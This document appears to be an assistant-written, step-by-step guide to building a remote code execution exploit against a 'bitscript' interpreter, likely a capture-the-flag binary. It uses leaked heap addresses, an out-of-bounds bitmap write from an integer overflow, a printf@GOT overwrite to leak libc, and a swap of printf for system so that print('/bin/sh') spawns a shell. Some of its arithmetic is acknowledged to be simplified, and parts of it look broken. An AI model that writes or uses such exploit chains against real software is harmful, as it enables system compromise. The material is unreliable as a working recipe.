# Practical RCE Exploit Guide

## Your Leaked Addresses

- `addr1 = 160550944` (0x9920C20) - string "first"
- `addr2 = 160551248` (0x9920D50) - string "second"
- `addr3 = 160551552` (0x9920E40) - string "third"
- `targetaddr` = address of "target" string (from your script)

**Spacing:** ~304 bytes between strings (consistent allocation pattern)

## Complete Exploit Chain

### Phase 1: Setup and Leak

```bitscript
// Leak heap addresses
int target = 0;
string target = "target";
int targetaddr = target;  // Leak target's string address
```

### Phase 2: Calculate Variable Entry Address

**From `targetaddr` (string structure address):**

Variable entry is typically **0x200-0x400 bytes before** the string:
- `entry_addr ≈ targetaddr - 0x300` (try this first)
- `value_ptr_addr = entry_addr + 0x28`

**We need to find the exact address. Options:**

**Option A: OOB Read Scan**
```bitscript
bitmap b1 = create(9223372036854775807, 2);
// Scan backwards from targetaddr
// Look for "target" name at offset 0x00
// When found, that's the variable entry
```

**Option B: Try Common Offsets**
- Try: `targetaddr - 0x100`, `-0x200`, `-0x300`, `-0x400`
- Use bitmap overflow to write test values
- Check if target variable changes

### Phase 3: Calculate Bitmap Write Coordinates

**Formula:**
```
target = entry_addr + 0x28  // value_ptr offset
bitmap_data_ptr + (y * INT64_MAX + x) / 8 = target

y = ((target - bitmap_data_ptr) * 8) / INT64_MAX
x = ((target - bitmap_data_ptr) * 8) % 8
```

**Challenge:** We need `bitmap_data_ptr` (heap address)

**Solution:** Bitmap is allocated after variables, so:
- `bitmap_data_ptr ≈ targetaddr + 0x1000` (estimate)
- Or use OOB read to find it

### Phase 4: Write printf@GOT Address

**Target:** `0x409048` (printf@GOT)

**0x409048 in binary (64-bit, little-endian):**
```
Bytes: 48 90 40 00 00 00 00 00
Binary: 01001000 10010000 01000000 00000000 ...
```

**Set bits manually:**
```bitscript
// For byte 0 (0x48 = 0b01001000):
set(b1, x + 3, y, 1);   // Bit 3
set(b1, x + 6, y, 1);   // Bit 6

// For byte 1 (0x90 = 0b10010000):
set(b1, x + 0, y + 1, 1);  // Bit 0 (next byte)
set(b1, x + 3, y + 1, 1);  // Bit 3
set(b1, x + 4, y + 1, 1);  // Bit 4

// For byte 2 (0x40 = 0b01000000):
set(b1, x + 6, y + 2, 1);  // Bit 6
```

**Note:** This is simplified - need to account for bit positions across 8 bytes.

### Phase 5: Read libc Address

```bitscript
int libc_leak = target;  // Reads from printf@GOT
print(libc_leak);        // Prints libc's printf address
```

### Phase 6: Calculate system Address

**Need libc offsets:**
```bash
# On target system:
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " printf"
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
```

**Calculate:**
```
libc_base = leaked_printf - printf_offset
system_addr = libc_base + system_offset
```

### Phase 7: Write system to printf@GOT

**Same as Phase 4, but write `system_addr` instead of `0x409048`**

**Target:** `0x409048` (printf@GOT)
**Value:** `system_addr` (calculated from libc leak)

### Phase 8: Trigger RCE

```bitscript
print("/bin/sh");  // Calls printf, but printf@GOT → system
                   // → system("/bin/sh") → shell!
```

## Practical Implementation Steps

### Step 1: Find Exact Addresses

**Create OOB read script:**
```bitscript
bitmap b1 = create(9223372036854775807, 2);
int target = 0;
string target = "target";
int targetaddr = target;

// Scan backwards from targetaddr
// Read bits to find "target" name pattern
```

### Step 2: Test Address Calculation

**Once we find entry address:**
1. Calculate `value_ptr_addr = entry_addr + 0x28`
2. Calculate `y` and `x` for bitmap write
3. Write a test value (e.g., `0x41414141`)
4. Check if `target` variable changes

### Step 3: Write printf@GOT Address

**Once coordinates are correct:**
1. Write `0x409048` bit-by-bit
2. Read `target` to verify it points to GOT
3. Read libc address

### Step 4: Complete RCE

1. Calculate system address
2. Write system to GOT
3. Trigger shell

## Challenges and Solutions

### Challenge 1: Finding Exact Addresses

**Solution:** Use OOB read to scan heap, look for variable name patterns

### Challenge 2: Bit-by-Bit Write

**Solution:** Pre-calculate all bit positions, write manually

### Challenge 3: Alignment

**Solution:** Calculate `x` and `y` carefully, account for byte boundaries

## Alternative: Simpler Approach

If finding exact addresses is too difficult, we could:

1. **Use string overflow** (already working) to corrupt variable table
2. **Use type confusion** to leak addresses (already working)
3. **Combine both** for more reliable corruption

The key is that **variable corruption gives us byte-level operations**, which is easier than bit-by-bit writes!

## Next Steps

1. Create OOB read script to find variable entry addresses
2. Test address calculations
3. Write exploit script with calculated coordinates
4. Test libc leak
5. Complete RCE

Your leaked addresses (`160550944`, `160551248`, `160551552`) are the foundation - now we build the exploit on top!

